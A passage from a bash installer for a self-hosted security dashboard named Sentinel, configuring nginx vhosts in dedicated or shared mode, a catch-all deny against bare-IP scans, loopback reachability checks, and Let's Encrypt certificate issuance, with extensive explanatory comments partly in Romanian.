    install -m 0644 "${SCRIPT_DIR}/nginx/sentinel-security-headers.conf"         "${SENTINEL_NGINX_SNIPPET_DIR}/security-headers.conf"
    install -m 0644 "${SCRIPT_DIR}/nginx/sentinel-proxy-params.conf"         "${SENTINEL_NGINX_SNIPPET_DIR}/proxy-params.conf"

    # Versiunile vechi le lasau in conf.d, unde continua sa se aplice global.
    # Un upgrade trebuie sa le si elimine, altfel reparatia nu repara nimic pe
    # exact gazdele care au nevoie de ea.
    for stale in /etc/nginx/conf.d/sentinel-security-headers.conf                  /etc/nginx/conf.d/sentinel-proxy-params.conf; do
        if [[ -f "$stale" ]]; then
            rm -f "$stale"
            ok "removed ${stale} - it applied to every site on this host"
        fi
    done
}

# ---------------------------------------------------------------------------
# Dedicated mode: who answers on :PUBLIC_PORT
# ---------------------------------------------------------------------------
#
# In dedicated mode Sentinel owns PUBLIC_PORT outright, so there are exactly
# two honest configurations of it. The installer must land in one of them and
# never between, because between them is where the outage lives:
#
#   --domain given    the app vhost is selected by that name; the deny block
#                     keeps default_server and refuses every other Host.
#                     Strong posture, and the operator was told the name.
#   --domain absent   the installer cannot know how the operator will browse
#                     to this machine. So the app vhost becomes default_server
#                     itself and NO deny block is installed: the dashboard
#                     answers on that port whatever the Host. Weaker, said out
#                     loud here and again in the closing summary.
#
# The third state was measured on the live Ubuntu host on 2026-09-18: two
# server blocks on :8443, BOTH `server_name _`, the deny block holding
# `default_server`. `_` is not a wildcard — it is a name no real Host ever
# equals — so nothing matched either block by name, every request fell through
# to default_server, and every request got 444. `systemctl is-active
# sentinel-web` said active, `ss -lntp` showed nginx bound to the port, and the
# installer reported success at every step.
#
# GUESSING THE NAME WAS REJECTED AS THE REPAIR, and that is the part worth
# keeping. `hostname -f` on that host is n8n.example.com; the operator
# reaches it at n8n.example.net. A vhost named after the guess
# routes nothing, the deny block still wins, and the operator still gets 444 —
# the same outage, produced by its own fix. Widening server_name with a guessed
# LIST (short name, FQDN, public IP) is worse: putting the address there hands
# a bare-IP scan the login page, which is the one thing the deny block exists
# to prevent.

# Renders the pair of files that decides who answers on :PUBLIC_PORT.
#
#   $1  directory to write them into (/etc/nginx/conf.d in production; the
#       tests point it at a temp dir and read the result back)
#   $2  path(s) of a block that ALREADY declares default_server on this port
#       and is not ours, or "" when there is none. Measured by the caller,
#       because measuring it means grepping /etc/nginx.
#
# Reads DOMAIN, PUBLIC_PORT, SCRIPT_DIR. Writes sentinel.conf always;
# sentinel-default-deny.conf only with --domain, and DELETES it otherwise. The
# delete is not tidiness: a host installed by an earlier version has that file
# on disk, and a re-deploy that merely declined to write it would leave the 444
# exactly where it is.
render_dedicated_vhosts() {
    local dir="$1" foreign_default="$2"
    local conf="${dir}/sentinel.conf"
    local deny_conf="${dir}/sentinel-default-deny.conf"
    local vhost_name vhost_default

    if [[ -n "$DOMAIN" ]]; then
        vhost_name="$DOMAIN"
        vhost_default=""
    else
        # `_` is safe HERE and only here, because this block carries
        # default_server: nginx selects it for every Host that matches nothing
        # else, which on a port of our own is every Host. The name is never
        # consulted, so it cannot be the wrong guess.
        vhost_name="_"
        vhost_default=" default_server"

        # Two default_server blocks on one port is not a weaker posture, it is
        # `nginx -t` refusing the entire configuration ("duplicate default
        # server"). Stopping here, before anything is written, is the only
        # answer that does not leave the operator's nginx unreloadable.
        if [[ -n "$foreign_default" ]]; then
            die "--nginx-mode dedicated without --domain needs Sentinel's own vhost to be \
the default server on :${PUBLIC_PORT}, and this already declares default_server there:
        ${foreign_default}
nginx refuses a configuration with two of them. Either pass --domain <name>, which selects \
Sentinel's vhost by name and leaves that block alone, or move that block off :${PUBLIC_PORT}."
        fi
    fi

    sed -e "s|@@DOMAIN@@|${vhost_name}|g" \
        -e "s|@@DEFAULT_SERVER@@|${vhost_default}|g" \
        -e "s|@@PORT@@|8787|g" \
        -e "s|@@PUBLIC_PORT@@|${PUBLIC_PORT}|g" \
        -e "s|@@TLS_DIR@@|$(tls_dir)|g" \
        "${SCRIPT_DIR}/nginx/sentinel.conf.tmpl" > "$conf"

    if [[ -z "$DOMAIN" ]]; then
        rm -f "$deny_conf"
        warn "no --domain given, so the dashboard on :${PUBLIC_PORT} answers to ANY Host, \
including a bare-IP scan, and no catch-all deny is installed. That is deliberate: guessing \
a name is what made every request return 444. Narrow it to one name by re-running with \
--domain <name>."
        return 0
    fi

    # Catch-all deny for requests that reach Sentinel's port without naming its
    # vhost. Without it, nginx makes Sentinel's the default for that port and it
    # answers for ANY Host — so a bare-IP scan returns the login page,
    # advertising both that a security dashboard exists here and where to aim a
    # credential attack.
    #
    # Scoped to Sentinel's port only, so it cannot collide with a default_server
    # someone else declared on 80 or 443.
    if [[ -n "$foreign_default" ]]; then
        rm -f "$deny_conf"
        warn "another vhost already declares default_server on :${PUBLIC_PORT}:"
        printf '        %s\n' $foreign_default >&2
        warn "Skipped Sentinel's catch-all to avoid breaking it. Verify by hand that"
        warn "https://<this-ip>:${PUBLIC_PORT}/ does NOT return the Sentinel login page."
        return 0
    fi

    sed -e "s|@@PUBLIC_PORT@@|${PUBLIC_PORT}|g" \
        -e "s|@@TLS_DIR@@|$(tls_dir)|g" \
        "${SCRIPT_DIR}/nginx/sentinel-default-deny.conf.tmpl" > "$deny_conf"
    chmod 0644 "$deny_conf"
    ok "catch-all deny on :${PUBLIC_PORT} — only https://${DOMAIN}:${PUBLIC_PORT} reaches the dashboard"
}

# One HTTPS request, its status code as a fact. Never fails the caller.
#
# WHY A FUNCTION AND NOT A `curl` WRITTEN WHERE THE VERDICT IS TAKEN. Under
# `set -euo pipefail`, a plain `code="$(curl …)"` at step level aborts the
# WHOLE installer, silently, the instant curl exits nonzero — and curl does
# that routinely here for reasons that are not "nginx is broken": rc=7 on a
# closed port, rc=92 on an HTTP/2 framing error when nginx answers 444
# (observed on the live Ubuntu host, 8 Sep 2026). The step then died on the
# assignment with no message at all, so the verdict it was about to print
# never appeared. Here the curl runs inside the subshell of the caller's own
# `$( … )`, which bash does NOT give errexit to unless `inherit_errexit` is
# set (it is not, anywhere in this tree) — so a nonzero curl can no longer
# take the caller down, and whatever `-w` captured before curl failed is
# still what gets printed and judged.
#
# `|| true` is a SECOND guard, not the one doing the work: it is what keeps
# that true if this is ever called outside a command substitution, or if
# `inherit_errexit` is ever switched on. Measured on 18 Sep 2026: removing it
# today changes no observable behaviour, precisely because of the subshell.
https_code() {
    local url="$1"; shift
    local code
    code="$(curl -sk --max-time 10 -o /dev/null -w '%{http_code}' ${1+"$@"} "$url" 2>/dev/null || true)"
    [[ -n "$code" ]] || code="000"
    printf '%s' "$code"
}

# Codes that mean Sentinel's own vhost answered. 401/302 are what an
# unauthenticated request can legitimately get; 503 is the app still starting.
SENTINEL_ANSWERED='^(200|301|302|303|307|308|401|503)$'

# Why a name did not answer from here — measured, and explicitly UNKNOWN when
# it cannot be measured. One line, never fails.
name_resolution_note() {
    local name="$1" answer own
    if ! have getent; then
        printf 'whether %s resolves at all is UNKNOWN from here — getent is missing from this host' "$name"
        return 0
    fi
    # `|| true`: a name that does not resolve is getent's ORDINARY way of
    # saying so (nonzero exit), not a script fault — and `pipefail` would turn
    # that into an immediate abort of the whole installer over a diagnostic.
    answer="$(getent hosts "$name" 2>/dev/null | awk '{print $1}' | tr '\n' ' ' || true)"
    if [[ -z "${answer// /}" ]]; then
        printf '%s does not resolve on this host at all' "$name"
        return 0
    fi
    own="$(public_ips | tr '\n' ' ' || true)"
    printf '%s resolves here to %s; this host owns %s' \
        "$name" "${answer% }" "${own:-<no global address>}"
}

# Does the configuration just written actually deliver a request to Sentinel?
#
# `nginx -t` and reload_nginx prove the file parses and that the master adopted
# it. NEITHER proves a request reaches Sentinel's vhost rather than something
# that closes the connection — both were green on the host in the outage, for
# weeks, while every visit got 444.
#
# The question differs by configuration, because the honest question does:
#
#   --domain   the vhost is selected by name, so the proof is that a request
#              FOR THAT NAME reaches Sentinel, and separately that one for any
#              other Host does not.
#   no domain  the vhost is default_server, so the proof is that a request
#              naming nothing this host knows reaches Sentinel anyway.
#
# TWO SEPARATE FACTS IN THE --domain CASE, and they are reported separately on
# purpose. A probe that lets this host resolve the name itself measures the
# operator's own path, but a 200 from it does not prove OUR nginx answered —
# the name may point at another machine entirely. A probe pinned to 127.0.0.1
# proves our routing and says nothing about whether anything outside can get
# here. So the pinned probe decides whether the step lives or dies, and the
# resolved probe decides whether something is recorded for the closing summary.
verify_dashboard_answers() {
    local unknown_host="nu-exista.sentinel.invalid"
    local code loop_code note

    if [[ -z "$DOMAIN" ]]; then
        # The Host header names something no block on this host is configured
        # for. If the app vhost holds default_server it answers; if anything
        # else does, this is the request that comes back empty — which is
        # exactly the outage, reproduced here before the operator meets it.
        code="$(https_code "https://127.0.0.1:${PUBLIC_PORT}/healthz" -H "Host: ${unknown_host}")"
        if [[ "$code" =~ $SENTINEL_ANSWERED ]]; then
            ok "a request naming nothing (Host: ${unknown_host}) reaches the dashboard on \
:${PUBLIC_PORT} (HTTP ${code}) — which is what 'no --domain' has to mean"
            return 0
        fi
        die "a request on :${PUBLIC_PORT} with an unknown Host answered ${code}, and without \
--domain that is the only kind of request there is: Sentinel's vhost is supposed to be the \
default server on this port. ${code} means something else is, so the dashboard is \
unreachable however the operator browses to it. Inspect with:
    nginx -T | grep -nE 'listen[[:space:]]+(\\[::\\]:)?${PUBLIC_PORT}|server_name'"
    fi

    # -- 1. The operator's own path: let this host resolve the name ----------
    code="$(https_code "https://${DOMAIN}:${PUBLIC_PORT}/healthz")"

    # -- 2. This host's nginx, pinned to loopback ----------------------------
    loop_code="$(https_code "https://${DOMAIN}:${PUBLIC_PORT}/healthz" \
                 --resolve "${DOMAIN}:${PUBLIC_PORT}:127.0.0.1")"
    if ! [[ "$loop_code" =~ $SENTINEL_ANSWERED ]]; then
        die "this host's own nginx answered ${loop_code} to https://${DOMAIN}:${PUBLIC_PORT}/healthz \
(name pinned to 127.0.0.1, so neither DNS nor any firewall is in the way). The vhost for \
'${DOMAIN}' is not what serves that request — with the catch-all deny on :${PUBLIC_PORT} that \
is a closed connection for every visitor. Inspect with:
    nginx -T | grep -B2 -A8 'server_name ${DOMAIN}'"
    fi

    if [[ "$code" =~ $SENTINEL_ANSWERED ]]; then
        ok "https://${DOMAIN}:${PUBLIC_PORT}/healthz reaches the dashboard (HTTP ${code}), \
resolved the way a browser resolves it"
    else
        note="$(name_resolution_note "$DOMAIN")"
        warn "THE ROUTING CHECK WAS WEAKENED. Resolved normally from this host, \
https://${DOMAIN}:${PUBLIC_PORT}/healthz answered ${code}; only with the name pinned to \
127.0.0.1 did it answer ${loop_code}. So nginx here routes '${DOMAIN}' to the dashboard, but \
nothing here proves a visitor arrives. Measured: ${note}."
        obstacle "https://${DOMAIN}:${PUBLIC_PORT}/healthz does not answer when this host \
resolves the name itself (HTTP ${code}), although nginx here does serve it (HTTP ${loop_code} \
over loopback). Measured: ${note}. Point DNS for '${DOMAIN}' at this host, and make sure \
:${PUBLIC_PORT} is open on the way in."
    fi

    # -- 3. The hardening the operator was promised, not assumed -------------
    #
    # A bare IP in the URL sends no SNI, so nginx picks the default server for
    # the certificate and then the Host header picks the block — which is
    # precisely what a port scanner's request looks like.
    code="$(https_code "https://127.0.0.1:${PUBLIC_PORT}/" -H "Host: ${unknown_host}")"
    case "$code" in
        000|444)
            # Not "the catch-all deny is in effect": when a foreign
            # default_server was found above, ours was deliberately not
            # installed and it is THEIRS that refused. The effect is the same
            # and is what gets claimed; the mechanism is not assumed.
            ok "an unknown Host on :${PUBLIC_PORT} gets no response at all — a scan of this address learns nothing"
            ;;
        *)
            warn "an unknown Host on :${PUBLIC_PORT} answered HTTP ${code}. The catch-all deny \
is NOT refusing it, so a scan of this address learns that something is here. Find which block \
answers:
    nginx -T | grep -nE 'listen[[:space:]]+(\\[::\\]:)?${PUBLIC_PORT}.*default_server'"
            ;;
    esac
}

# --- 33 -------------------------------------------------------------------
step_nginx() {
    # The vhost `include`s both of these. Installing the vhost without them
    # makes `nginx -t` fail with a confusing "open() failed" before certbot ever
    # gets a chance to run.
    install_sentinel_nginx_snippets

    # A placeholder certificate so the `listen … ssl` block is valid on a fresh
    # host. certbot replaces it later; without it, nginx -t fails on a missing
    # certificate and the install stops before it can obtain a real one.
    ensure_placeholder_certificate

    # -- Do not fight over :80 -------------------------------------------------
    #
    # The distribution's nginx.conf ships a server block bound to :80. If
    # something else on this host owns that port, nginx refuses to start with
    # "bind() to 0.0.0.0:80 failed" — and the failure looks like a Sentinel bug
    # rather than a port conflict.
    #
    # Sentinel does not need :80 at all: it serves on its own port and does not
    # redirect. So the listener is neutralised — but ONLY if we installed nginx
    # ourselves. If nginx was already here serving the operator's sites, its
    # config is theirs and editing it would be exactly the collateral damage the
    # rest of this installer works to avoid.
    #
    # NGINX_WAS_PREEXISTING is the whole distinction, and it is recorded at step
    # 20, before the package install. It is also what settles the question the
    # previous writer left open — whether sites-enabled/default is ours to
    # remove. It is, on exactly the hosts where we are the ones who put it there.
    if ! port_free 80 && [[ "${NGINX_WAS_PREEXISTING:-0}" != "1" ]]; then
        local owner80 default_site undo
        owner80="$(port_owner 80)"
        default_site="$(nginx_default_site)"
        info "port 80 is held by ${owner80:-another service}; taking nginx's own :80 listener out of service"

        cp -a /etc/nginx/nginx.conf "${SNAPSHOT_DIR}/nginx.conf.orig" 2>/dev/null || true
        if [[ "$default_site" != /etc/nginx/nginx.conf ]]; then
            # -L: the debian default site is a symlink, and a copy of the link
            # is not a copy of what it pointed at.
            cp -aL "$default_site" "${SNAPSHOT_DIR}/nginx-default-site.orig" 2>/dev/null || true
        fi

        if undo="$(nginx_disable_default_listener)"; then
            info "$undo"
        else
            info "${default_site} is not present, so there was nothing to disable there"
        fi

        # The EFFECT, not the edit. The previous version ran a sed against a
        # file that on Ubuntu carries no active `listen 80` at all, matched
        # nothing, exited 0, and printed ":80 listener commented out" — while
        # the real block sat in sites-enabled/default saying
        # `listen 80 default_server;`.
        local port80_state=0
        nginx_listens_on_80 || port80_state=$?
        case $port80_state in
            0) warn "nginx STILL has an active :80 listener after disabling \
${default_site}. It will fail to bind while ${owner80:-the other service} holds \
the port. Find the block with:
    nginx -T | grep -nE 'listen[[:space:]]+([0-9.]+:|\\*:|\\[::\\]:)?80([^0-9]|\$)'" ;;
            1) ok "no :80 listener left in nginx's effective configuration" ;;
            2) warn "nginx would not dump its effective configuration, so whether \
:80 was released is UNKNOWN — not 'fine'. Check by hand: nginx -T" ;;
        esac
    elif ! port_free 80; then
        warn "port 80 is in use and nginx was already installed here. Not touching \
nginx.conf — it is yours. If nginx fails to start, a server block in it is \
competing for :80."
    fi

    # Measured BEFORE our own files are rewritten, and with BOTH of our own
    # files excluded from the answer. Without the sentinel.conf exclusion the
    # no-domain rendering below would find, on the next deploy, the
    # default_server IT wrote on this one, conclude that someone else owns the
    # port, and die — a repair that works once and then blocks every re-deploy.
    local foreign_default="" fd_state=0
    foreign_default="$(nginx_foreign_default_on_port "$PUBLIC_PORT" \
        /etc/nginx/conf.d/sentinel.conf \
        /etc/nginx/conf.d/sentinel-default-deny.conf)" || fd_state=$?

    # "Could not look" is not "nothing there", and it is not a reason to stop
    # either. nginx refusing to dump means its configuration does not parse —
    # possibly because of a broken sentinel.conf THIS RUN is about to replace,
    # so dying here would block the deploy that fixes it. So: say it, write our
    # files, and let the `nginx -t` twenty lines down be the thing that decides.
    # That check is not a formality here: two default_server blocks on one port
    # is exactly what it refuses, by name, with `duplicate default server`.
    if (( fd_state == 2 )); then
        foreign_default=""
        warn "nginx would not dump its effective configuration, so whether another block \
already claims default_server on :${PUBLIC_PORT} is UNKNOWN — not 'nothing there'. Sentinel's \
vhost is written anyway; if there IS such a block, the nginx -t below refuses the whole \
configuration with 'duplicate default server' and this step stops before reloading. Read it \
by hand with: nginx -T"
    fi

    render_dedicated_vhosts /etc/nginx/conf.d "$foreign_default"

    # SELinux blocks nginx from proxying to 127.0.0.1:8787 by default, and the
    # symptom is a 502 with nothing useful in the nginx log.
    security_module_allow_nginx_proxy

    nginx -t || die "nginx configuration is invalid; not reloading"
    systemctl enable --now nginx
    reload_nginx

    obtain_certificate

    # Proof, not report. Everything above says what was WRITTEN; this asks
    # nginx what it DOES with it, and stops the step when the answer is that
    # nothing reaches the dashboard.
    verify_dashboard_answers
}

# ---------------------------------------------------------------------------
# Shared mode: Sentinel as a vhost on the operator's existing nginx
# ---------------------------------------------------------------------------
SENTINEL_NGINX_FILES=(
    /etc/nginx/conf.d/sentinel-shared.conf
    /etc/nginx/sentinel/security-headers.conf
    /etc/nginx/sentinel/proxy-params.conf
    # Locul vechi, pastrat in lista ca dezinstalarea sa curete si
    # gazdele instalate inainte de mutare.
    /etc/nginx/conf.d/sentinel-security-headers.conf
    /etc/nginx/conf.d/sentinel-proxy-params.conf
)

remove_sentinel_nginx_files() {
    rm -f "${SENTINEL_NGINX_FILES[@]}" /etc/nginx/conf.d/sentinel.conf \
          /etc/nginx/conf.d/sentinel-default-deny.conf
}

step_nginx_shared() {
    # -- Refuse to proceed unless nginx really owns those ports ---------------
    #
    # Shared mode only makes sense if nginx is what is listening. If Apache or a
    # container owns 443, adding an nginx vhost achieves nothing and nginx would
    # then fail to bind.
    local owner443 owner80
    owner443="$(port_owner 443)"
    owner80="$(port_owner 80)"

    if ! grep -qi nginx <<< "${owner443}${owner80}"; then
        die "--nginx-mode shared requires nginx to own ports 80/443, but they are held \
by: 80=${owner80:-nothing} 443=${owner443:-nothing}. Use the default dedicated mode \
(--nginx-mode dedicated --web-port 8443) instead."
    fi
    ok "nginx owns 80/443 — Sentinel will be added as a vhost"

    # -- The config must be healthy BEFORE we touch it -----------------------
    #
    # If `nginx -t` already fails, adding our file makes us the prime suspect for
    # a break we did not cause, and we would have no clean state to return to.
    if ! nginx -t 2>/dev/null; then
        nginx -t || true
        die "nginx -t already fails BEFORE Sentinel touched anything. Fix the existing \
configuration first — Sentinel will not add a vhost to a broken nginx."
    fi
    ok "nginx -t passes before any change"

    install_sentinel_nginx_snippets

    ensure_placeholder_certificate

    sed -e "s|@@DOMAIN@@|${DOMAIN}|g" \
        -e "s|@@PORT@@|8787|g" \
        -e "s|@@TLS_DIR@@|$(tls_dir)|g" \
        "${SCRIPT_DIR}/nginx/sentinel-shared.conf.tmpl" \
        > /etc/nginx/conf.d/sentinel-shared.conf
    chmod 0644 /etc/nginx/conf.d/sentinel-shared.conf

    security_module_allow_nginx_proxy

    # -- And healthy AFTER. This is the important one. ----------------------
    #
    # A broken file here breaks `nginx -t` for the WHOLE server. A reload would
    # just be refused, so the operator's sites keep serving — but the next
    # restart, for any unrelated reason, would fail to start nginx at all. That
    # is a latent outage with our name on it, so a config that does not validate
    # is not allowed to stay on disk.
    if ! nginx -t 2>/dev/null; then
        nginx -t || true
        remove_sentinel_nginx_files
        if nginx -t 2>/dev/null; then
            die "Sentinel's vhost broke nginx -t, so it was REMOVED and nginx is valid \
again. Your sites are unaffected. Report the nginx -t output above."
        fi
        die "Sentinel's vhost broke nginx -t and removing it did not restore validity. \
INSPECT /etc/nginx NOW — do not restart nginx until nginx -t passes."
    fi
    ok "nginx -t passes with Sentinel's vhost added"

    reload_nginx
    ok "nginx reloaded"

    obtain_certificate

    # -- Did we accidentally become the default vhost? ----------------------
    #
    # If no vhost on this host declares `default_server`, nginx uses the first one
    # it loaded — which depends on filename order in conf.d and could be ours.
    # Then a bare-IP request would return the Sentinel login page, advertising
    # that a security dashboard lives here.
    #
    # Tested rather than assumed, and reported rather than fixed: claiming
    # `default_server` ourselves, or editing the operator's vhost to claim it,
    # would change how their sites answer an unknown Host.
    local unknown_host
    unknown_host="$(curl -sk --max-time 8 -o /dev/null -w '%{http_code}' \
        -H 'Host: sentinel-default-probe.invalid' "https://127.0.0.1/" 2>/dev/null || echo 000)"
    local probe_body
    probe_body="$(curl -sk --max-time 8 -H 'Host: sentinel-default-probe.invalid' \
        "https://127.0.0.1/login" 2>/dev/null | head -c 2000 || true)"

    if grep -qi 'sentinel' <<< "$probe_body"; then
        warn "A request with an UNKNOWN Host header returns Sentinel's dashboard \
(HTTP ${unknown_host}). That means no vhost on this host declares default_server, so \
nginx picked Sentinel's. A bare-IP scan would find the login page."
        warn "Fix it in YOUR vhost — add default_server to its listen directives:"
        warn "    listen 443 ssl default_server;"
        warn "Sentinel will not do this for you: it would change which of your sites"
        warn "answers an unknown Host, and that is your decision."
    else
        ok "an unknown Host does not reach Sentinel (HTTP ${unknown_host})"
    fi
}

ensure_placeholder_certificate() {
    # /etc/pki is an RPM convention; Debian and Ubuntu keep this under /etc/ssl
    # and have no /etc/pki at all. See tls_dir in lib/distro.sh.
    local dir; dir="$(tls_dir)"
    local cert="${dir}/certs/sentinel-selfsigned.crt"
    local key="${dir}/private/sentinel-selfsigned.key"
    [[ -f "$cert" ]] && return 0

    # Created only when absent. Debian ships /etc/ssl/private as 0710
    # root:ssl-cert, and an `install -d -m` over an existing directory would
    # change a mode that is not ours to change.
    [[ -d "${dir}/certs" ]]   || install -d -m 0755 "${dir}/certs"
    [[ -d "${dir}/private" ]] || install -d -m 0700 "${dir}/private"

    openssl req -x509 -nodes -newkey rsa:2048 -days 365 \
        -keyout "$key" -out "$cert" \
        -subj "/CN=${DOMAIN:-$(hostname -f 2>/dev/null || hostname)}" >/dev/null 2>&1 \
        || die "could not generate the placeholder certificate"
    chmod 0600 "$key"
    ok "placeholder self-signed certificate generated"
}

# ---------------------------------------------------------------------------
# TLS certificate, without owning port 80
# ---------------------------------------------------------------------------
# `certbot --nginx` is unavailable: it needs the HTTP-01 challenge on :80, and
# something else on this host owns that. TLS-ALPN-01 is out for the same reason
# (it needs :443). So the options are a webroot served by whatever DOES own :80,
# or a DNS-01 challenge.
#
# ACME_WEBROOT is the directory certbot writes the challenge token into. For this
# to work, the service on :80 must serve
#   http://<domain>/.well-known/acme-challenge/  →  ${ACME_WEBROOT}/.well-known/acme-challenge/
ACME_WEBROOT=/var/lib/letsencrypt

acme_challenge_reachable() {
    # Actually test it rather than hoping. Write a token, fetch it over plain
    # HTTP from outside, remove it. Certbot would otherwise fail after an
    # authorisation attempt, which counts against Let's Encrypt's rate limits and
    # triggers this installer's rollback for something recoverable.
    #
    # Retried, because this runs immediately after `systemctl reload nginx`: a
    # reload is graceful and asynchronous, so for a brief moment the old workers
    # may still be answering without the new :80 ACME location. A single probe
    # that lands in that window is a FALSE negative — and a false negative here
    # skips certbot entirely and leaves a self-signed certificate on a working
    # dashboard, which is exactly what happened on the first real deploy. A few
    # short retries cost nothing and remove the race.
    local token_dir="${ACME_WEBROOT}/.well-known/acme-challenge"
    local token="sentinel-probe-$(date +%s)"

    mkdir -p "$token_dir"
    printf 'sentinel-acme-probe\n' > "${token_dir}/${token}"
    chmod 0644 "${token_dir}/${token}"

    local body="" attempt
    for attempt in 1 2 3 4 5; do
        body="$(curl -fsS --max-time 12 "http://${DOMAIN}/.well-known/acme-challenge/${token}" 2>/dev/null || true)"
        [[ "$body" == "sentinel-acme-probe" ]] && break
        sleep 2
    done
    rm -f "${token_dir}/${token}"

    [[ "$body" == "sentinel-acme-probe" ]]
}

print_webroot_instructions() {
    # In shared mode Sentinel serves the challenge itself, so a failure here is
    # not about someone else's config — it is DNS, the firewall, or nginx.
    if [[ "$NGINX_MODE" == "shared" ]]; then
        cat >&2 <<EOF

  ── De ce a eșuat, în mod shared ─────────────────────────────────────────────

  În modul shared, Sentinel servește singur provocarea ACME din propriul bloc
  :80 pentru ${DOMAIN}. Dacă nu a funcționat, cauza NU este configurația altui
  serviciu. Verifică, în ordine:

    1. DNS:      dig +short ${DOMAIN}      → trebuie să dea IP-ul acestui server
    2. Firewall: portul 80 accesibil din internet (security group la provider)
    3. Vhost:    nginx -T | grep -A5 'server_name ${DOMAIN}'
    4. Manual:   curl -v http://${DOMAIN}/.well-known/acme-challenge/test

  Apoi reia doar pasul de certificat:

      sudo ${SCRIPT_DIR}/install.sh --domain ${DOMAIN} \\
          --nginx-mode shared --cert-mode webroot --from-step 33

EOF
        return 0
    fi

    cat >&2 <<EOF

  ── Cum obții un certificat real ─────────────────────────────────────────────

  Sentinel nu deține portul 80, deci provocarea HTTP-01 trebuie servită de
  serviciul care îl deține. Adaugă în configurația ACELUI serviciu:

  nginx:
      location ^~ /.well-known/acme-challenge/ {
          root ${ACME_WEBROOT};
          default_type "text/plain";
          allow all;
      }

  Apache:
      Alias /.well-known/acme-challenge/ ${ACME_WEBROOT}/.well-known/acme-challenge/
      <Directory "${ACME_WEBROOT}/.well-known/acme-challenge/">
          Require all granted
      </Directory>

  Caddy:
      handle /.well-known/acme-challenge/* {
          root * ${ACME_WEBROOT}
          file_server
      }

  Apoi reîncarcă acel serviciu și rulează:

      sudo ${SCRIPT_DIR}/install.sh --domain ${DOMAIN} \\
          --web-port ${PUBLIC_PORT} --cert-mode webroot --from-step 33

  ── Alternativ: mod shared, dacă :80 e ținut de nginx ────────────────────────

  Dacă nginx e cel care deține 80/443, Sentinel poate deveni un vhost pe el în
  loc de un port separat. Atunci servește singur provocarea ACME și certificatul
  se emite fără să atingi nimic:

      sudo ${SCRIPT_DIR}/install.sh --domain ${DOMAIN} --nginx-mode shared

  ── Alternativ: DNS-01, fără să atingi serviciul de pe :80 ───────────────────

  Nu are nevoie de niciun port. Instalează plugin-ul DNS al registrarului tău
  (ex. python3-certbot-dns-cloudflare), pune credențialele, apoi:

      sudo certbot certonly --dns-<provider> -d ${DOMAIN} \\
          --agree-tos -m ${ADMIN_EMAIL:-admin@${DOMAIN}} --non-interactive
      sudo ${SCRIPT_DIR}/install.sh --domain ${DOMAIN} \\
          --web-port ${PUBLIC_PORT} --cert-mode none --from-step 33

EOF
}

sentinel_vhost_file() {
    # Which file holds Sentinel's vhost depends on the mode. Getting this wrong
    # means editing a file that does not exist, and silently keeping the
    # self-signed certificate after a successful issuance.
    if [[ "$NGINX_MODE" == "shared" ]]; then
        printf '/etc/nginx/conf.d/sentinel-shared.conf'
    else
        printf '/etc/nginx/conf.d/sentinel.conf'
    fi
}

link_certificate() {
    # Point the vhost at the issued certificate. certbot --nginx would normally
    # rewrite the file itself, but it is not driving nginx here — and in shared
    # mode letting it edit a config directory full of the operator's own vhosts
    # would be exactly the kind of reach this installer avoids.
    local live="/etc/letsencrypt/live/${DOMAIN}"
    local vhost; vhost="$(sentinel_vhost_file)"
    [[ -f "${live}/fullchain.pem" ]] || return 1
    [[ -f "$vhost" ]] || { warn "vhost file ${vhost} not found"; return 1; }

    # Only the first occurrence pair, and only in Sentinel's own file: in shared
    # mode a global sed across conf.d would rewrite the operator's certificates.
    sed -i \
        -e "s|ssl_certificate .*|ssl_certificate     ${live}/fullchain.pem;|" \
        -e "s|ssl_certificate_key .*|ssl_certificate_key ${live}/privkey.pem;|" \
        "$vhost"

    # The catch-all keeps the self-signed placeholder on purpose: a client
    # reaching it did not name the vhost, and presenting the real certificate
    # would confirm which domain lives on this address.

    nginx -t || { warn "nginx -t failed after pointing at the certificate"; return 1; }
    reload_nginx
    return 0
}

obtain_certificate() {
    if [[ -z "$DOMAIN" ]]; then
        warn "no domain: serving with a self-signed certificate on :${PUBLIC_PORT}. \
Every browser visit warns, and you will train yourself to click through TLS \
warnings — exactly the habit an attacker relies on."
        return 0
    fi

    if [[ "$CERT_MODE" == "selfsigned" ]]; then
        warn "--cert-mode selfsigned: keeping the placeholder certificate"
        return 0
    fi

    # Already issued — link and move on. Also the path for --cert-mode none,
    # where the operator ran certbot themselves.
    if [[ -f "/etc/letsencrypt/live/${DOMAIN}/fullchain.pem" ]]; then
        if link_certificate; then
            ok "certificate for ${DOMAIN} in place"
            install_renewal_hook
            return 0
        fi
        warn "a certificate exists for ${DOMAIN} but could not be linked"
        return 0
    fi

    if [[ "$CERT_MODE" == "none" ]]; then
        warn "--cert-mode none and no certificate at /etc/letsencrypt/live/${DOMAIN}"
        print_webroot_instructions
        return 0
    fi

    local email="${ADMIN_EMAIL:-admin@${DOMAIN}}"
    mkdir -p "${ACME_WEBROOT}/.well-known/acme-challenge"

    case "$CERT_MODE" in
        dns)
            warn "--cert-mode dns: this installer does not guess your DNS provider."
            print_webroot_instructions
            return 0
            ;;
        webroot|auto)
            if [[ "$CERT_MODE" == "auto" ]]; then
                info "testing whether the service on :80 can serve an ACME challenge"
                if ! acme_challenge_reachable; then
                    warn "http://${DOMAIN}/.well-known/acme-challenge/ is not served \
from ${ACME_WEBROOT}, so certbot cannot prove domain control."
                    warn "Keeping the self-signed certificate — the dashboard works, \
but browsers will warn."
                    print_webroot_instructions
                    return 0
                fi
                ok "ACME challenge path is reachable"
            fi

            # certonly, not --nginx: certbot must not rewrite a vhost it does not
            # manage, and must not try to bind a port it cannot have.
            if certbot certonly --webroot -w "$ACME_WEBROOT" -d "$DOMAIN" \
                    --agree-tos -m "$email" --non-interactive --keep-until-expiring; then
                link_certificate && ok "Let's Encrypt certificate issued for ${DOMAIN}"
                install_renewal_hook
            else
                # Not fatal. A failed certificate is a browser warning; failing the
                # install here would roll back a working dashboard over something
                # fixable in five minutes.
                warn "certbot failed. The dashboard still works on the self-signed \
certificate; fix the challenge path and re-run with --cert-mode webroot --from-step 33."
                print_webroot_instructions
            fi
            ;;
        *)
            die "unknown --cert-mode: ${CERT_MODE} (auto|webroot|dns|selfsigned|none)"
            ;;
    esac
}

install_renewal_hook() {
    # Reload rather than restart: no dropped connections, and nothing else on the
    # host is disturbed. A renewal that silently fails to reload is the classic
    # cause of "the dashboard broke exactly 90 days after we deployed it".
    install -D -m 0755 /dev/stdin \
        /etc/letsencrypt/renewal-hooks/deploy/sentinel-reload-nginx.sh <<'EOF'
#!/bin/sh
# Installed by Sentinel. Reloads nginx after a certificate renewal.
